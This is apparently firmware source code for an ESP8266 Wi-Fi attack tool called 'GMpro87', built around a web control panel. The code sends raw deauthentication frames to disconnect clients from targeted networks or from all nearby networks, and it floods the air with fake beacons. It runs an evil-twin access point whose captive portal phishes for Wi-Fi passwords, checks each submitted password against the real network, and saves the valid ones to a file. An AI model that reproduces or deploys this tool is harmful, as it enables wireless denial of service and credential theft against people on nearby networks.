#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

// ================= KONFIGURASI =================
#define LED_PIN 2 
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

typedef struct { 
  String ssid; 
  uint8_t ch; 
  uint8_t bssid[6]; 
  int rssi; 
  int usr; 
} _Network;

_Network _networks[16];
_Network _selectedNetwork;
String _eventLogs = "";
int temp_usr = 0;
uint8_t current_target_bssid[6];

bool hotspot_active = false, deauthing_active = false, mass_deauth = false, beacon_active = false;
String config_ssid = "GMpro2";
String config_pass = "Sangkur87";
int selectedET = 1;
int beacon_count = 10;

// ================= CORE FUNCTIONS =================

void sniffer_callback(uint8_t *buf, uint16_t len) {
  if (len < 34) return;
  if (memcmp(buf + 10, current_target_bssid, 6) == 0 || memcmp(buf + 16, current_target_bssid, 6) == 0) {
    temp_usr++;
  }
}

void addLog(String msg) {
  Serial.println(msg);
  _eventLogs = "[" + String(millis()/1000) + "s] " + msg + "\n" + _eventLogs;
  if (_eventLogs.length() > 1000) _eventLogs = _eventLogs.substring(0, 1000);
}

void sendDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
  memcpy(&pkt[10], bssid, 6); memcpy(&pkt[16], bssid, 6);
  for(int i=0; i<3; i++) { wifi_send_pkt_freedom(pkt, 26, 0); delay(1); }
}

void sendBeacon(String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x01, 0x04, 0x00, 0x00 };
  int ssidLen = ssid.length();
  if(ssidLen > 32) ssidLen = 32;
  pkt[37] = (uint8_t)ssidLen;
  for(int i=0; i<ssidLen; i++) pkt[38+i] = ssid[i];
  uint8_t postSSID[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, ch };
  memcpy(&pkt[38 + ssidLen], postSSID, sizeof(postSSID));
  wifi_send_pkt_freedom(pkt, 38 + ssidLen + sizeof(postSSID), 0);
}

// ================= WEB HANDLERS =================

void handleRoot() {
  if (webServer.hasArg("scan")) { 
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i); 
      _networks[i].rssi = WiFi.RSSI(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
      temp_usr = 0;
      memcpy(current_target_bssid, _networks[i].bssid, 6);
      wifi_set_channel(_networks[i].ch);
      wifi_set_promiscuous_rx_cb(sniffer_callback);
      wifi_promiscuous_enable(1);
      delay(200); 
      wifi_promiscuous_enable(0);
      _networks[i].usr = (temp_usr > 0) ? (temp_usr / 10) + 1 : 0;
      if (_networks[i].usr > 20) _networks[i].usr = 12;
    }
    addLog("Scan Done.");
  }

  if (webServer.hasArg("ap_idx")) {
    int idx = webServer.arg("ap_idx").toInt();
    if(idx >= 0 && idx < 16) { _selectedNetwork = _networks[idx]; addLog("Lock: " + _selectedNetwork.ssid); }
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
  if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "1");
  if (webServer.hasArg("beacon")) beacon_active = (webServer.arg("beacon") == "1");
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "1");
    if (hotspot_active && _selectedNetwork.ssid != "") {
      WiFi.softAP(_selectedNetwork.ssid.c_str(), "", _selectedNetwork.ch);
      addLog("EvilTwin Active: " + _selectedNetwork.ssid);
    } else {
      WiFi.softAP(config_ssid.c_str(), config_pass.c_str());
      hotspot_active = false;
      addLog("Admin Mode Active.");
    }
  }
  if (webServer.hasArg("save_cfg")) {
    config_ssid = webServer.arg("s_ssid"); config_pass = webServer.arg("s_pass");
    selectedET = webServer.arg("s_tmpl").toInt();
    addLog("Saved. Reboot...");
    webServer.send(200, "text/plain", "Rebooting..."); delay(1000); ESP.restart();
  }

  // HTML CSS (LOCKED)
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body { font-family: 'Courier New', Courier, monospace; background: #0d0d0d; color: #00ff00; margin: 0; padding: 10px; } .content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 15px; box-sizing: border-box; } .header-box { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 15px; } .tabs { display: flex; gap: 5px; margin-bottom: 15px; } .tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; font-weight: bold; font-size: 10px; } .active-btn { background: #00ff00 !important; color: #000 !important; } .tab-content { display: none; border-top: 1px solid #333; padding-top: 15px; } .show { display: block; } table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 9px; table-layout: fixed; } th, td { border: 1px solid #00ff00; padding: 4px 2px; text-align: center; overflow: hidden; white-space: nowrap; } th { background: #1a1a1a; } .btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; cursor: pointer; font-size: 9px; width: 100%; display: block; box-sizing: border-box; margin-bottom: 5px; text-align: center; text-decoration: none; text-transform: uppercase; } .btn:active { background: #00ff00; color: #000; } input, select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-family: 'Courier New'; } textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; font-size: 10px; margin-top: 10px; } label { font-size: 11px; display: block; margin-bottom: 3px; } .upload-section { border: 1px dashed #00ff00; padding: 10px; margin-bottom: 15px; }</style></head><body><div class='content'><div class='header-box'><h2>GMpro87</h2><span>by : 9u5M4n9</span></div><div class='tabs'><button id='btn-m' class='active-btn' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
  
  html += "<div id='m' class='tab-content show'><button class='btn' style='background:#0f0; color:#000; font-weight:bold;' onclick='location=\"/?scan=1\"'>RESCAN NETWORKS</button><div style='display:flex; gap:5px; margin-top:5px;'><a href='/?deauth=" + String(!deauthing_active) + "' style='flex:1'><button class='btn'>" + (deauthing_active?"STOP":"START") + " DEAUTH</button></a><a href='/?hotspot=" + String(!hotspot_active) + "' style='flex:1'><button class='btn'>" + (hotspot_active?"STOP":"START") + " ETWIN</button></a></div>";
  html += "<table><thead><tr><th style='width:30%'>SSID</th><th style='width:10%'>CH</th><th style='width:10%'>USR</th><th style='width:25%'>SIGNAL</th><th style='width:25%'>SELECT</th></tr></thead><tbody>";
  for(int i=0; i<16; i++) {
    if(_networks[i].ssid == "") continue;
    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(_networks[i].usr) + "</td><td>" + String(_networks[i].rssi) + "dBm</td><td><a href='/?ap_idx=" + String(i) + "'><button class='btn' style='padding:2px;'>SELECT</button></a></td></tr>";
  }
  html += "</tbody></table></div>";

  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3><a href='/?mass=" + String(!mass_deauth) + "'><button class='btn'>" + (mass_deauth?"STOP":"START") + " MASS DEAUTH</button></a><a href='/?beacon=" + String(!beacon_active) + "'><button class='btn' style='border-color:#ff00ea; color:#ff00ea;'>" + (beacon_active?"STOP":"START") + " BEACON SPAM</button></a></div>";

  html += "<div id='s' class='tab-content'><div class='upload-section'><label>Upload HTML Template:</label><form action='/upload' method='POST' enctype='multipart/form-data'><input type='file' name='upload'><button type='submit' class='btn' style='background:#0f0; color:#000;'>UPLOAD TO LITTLEFS</button></form></div>";
  html += "<label>Preview Selected Template:</label><a href='/preview' target='_blank'><button class='btn' style='background:#00f; color:#fff; border-color:#00f;'>HTML PREVIEW</button></a><hr style='border: 0.5px solid #333; margin: 15px 0;'><h3>Config</h3><form action='/' method='GET'><label>Template Active:</label><select name='s_tmpl'><option value='1' " + String(selectedET==1?"selected":"") + ">etwin1.html</option><option value='2' " + String(selectedET==2?"selected":"") + ">etwin2.html</option></select><label>Admin SSID:</label><input name='s_ssid' value='" + config_ssid + "'><label>Admin Pass:</label><input name='s_pass' value='" + config_pass + "'><button type='submit' name='save_cfg' value='1' class='btn' style='background:#0f0; color:#000; font-weight:bold;'>SAVE & RESTART</button></form></div>";

  html += "<textarea rows='6' readonly>" + _eventLogs + "</textarea></div><script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}</script></body></html>";
  webServer.send(200, "text/html", html);
}

// ================= SYSTEM INITIALIZATION =================

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  WiFi.mode(WIFI_AP_STA);
  wifi_set_opmode(STATIONAP_MODE);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str());
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.on("/", handleRoot);
  webServer.on("/preview", [](){
      File f = LittleFS.open("/etwin" + String(selectedET) + ".html", "r");
      if(f) { webServer.streamFile(f, "text/html"); f.close(); }
      else webServer.send(200, "text/plain", "Template not found on LittleFS.");
  });
  
  webServer.on("/upload", HTTP_POST, [](){ webServer.send(200, "text/html", "Done. <a href='/'>Back</a>"); }, [](){
    HTTPUpload& upload = webServer.upload();
    if(upload.status == UPLOAD_FILE_START){
      File f = LittleFS.open("/" + upload.filename, "w"); f.close();
    } else if(upload.status == UPLOAD_FILE_WRITE){
      File f = LittleFS.open("/" + upload.filename, "a"); f.write(upload.buf, upload.currentSize); f.close();
    }
  });

  webServer.on("/login", HTTP_POST, [](){
    String pass = webServer.arg("password");
    addLog("Checking: " + pass);
    WiFi.begin(_selectedNetwork.ssid.c_str(), pass.c_str());
    int t = 0;
    while (WiFi.status() != WL_CONNECTED && t < 16) { delay(500); t++; }
    if (WiFi.status() == WL_CONNECTED) {
      File f = LittleFS.open("/captured.txt", "a");
      f.println("SSID: " + _selectedNetwork.ssid + " | PASS: " + pass); f.close();
      webServer.send(200, "text/html", "<h2>System Updated. Please wait.</h2>");
      WiFi.disconnect();
    } else {
      webServer.send(200, "text/html", "<script>alert('Connection Error. Try Again.'); history.back();</script>");
    }
  });

  webServer.onNotFound([]() {
    if (hotspot_active) {
        File f = LittleFS.open("/etwin" + String(selectedET) + ".html", "r");
        if(f) { webServer.streamFile(f, "text/html"); f.close(); }
    } else handleRoot();
  });

  webServer.begin();
  addLog("GMpro87 Ready.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  static unsigned long last_atk = 0;
  if (millis() - last_atk >= 180) { // Interval tembak
    last_atk = millis();
    
    // 1. Single Deauth
    if (deauthing_active && _selectedNetwork.ssid != "") {
      sendDeauth(_selectedNetwork.bssid, _selectedNetwork.ch);
    }
    
    // 2. Mass Deauth (GALAK MODE)
    if (mass_deauth) {
      static int midx = 0;
      for(int i=0; i<16; i++) {
        midx = (midx + 1) % 16;
        if(_networks[midx].ssid != "") {
          sendDeauth(_networks[midx].bssid, _networks[midx].ch);
          break; 
        }
      }
    }
    
    // 3. Beacon Spam / Hotspot Beacon
    if (beacon_active || hotspot_active) {
      if(_selectedNetwork.ssid != "") sendBeacon(_selectedNetwork.ssid, _selectedNetwork.ch);
    }
  }
}
